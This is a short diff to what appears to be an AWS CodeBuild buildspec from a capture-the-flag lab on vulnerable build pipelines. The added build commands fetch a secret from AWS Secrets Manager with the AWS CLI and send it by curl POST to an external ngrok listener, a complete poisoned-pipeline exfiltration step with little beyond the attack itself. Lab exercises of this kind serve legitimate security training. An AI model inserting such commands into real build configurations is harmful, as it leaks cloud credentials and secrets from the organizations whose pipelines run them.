@@ -3,6 +3,10 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "Attempting extraction..."
+      # Use the AWS CLI to get the secret value. 
+      # The secret name mentioned in the lab context is flag_codebuild_lab_5
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id <SECRET_NAME> --region us-east-1 --query SecretString --output text)
+      
+      # Send the data to your listener (ngrok, webhook.site, etc.)
+      - curl -X POST https://ace-balneological-undaintily.ngrok-free.dev --data "label=$FLAG"
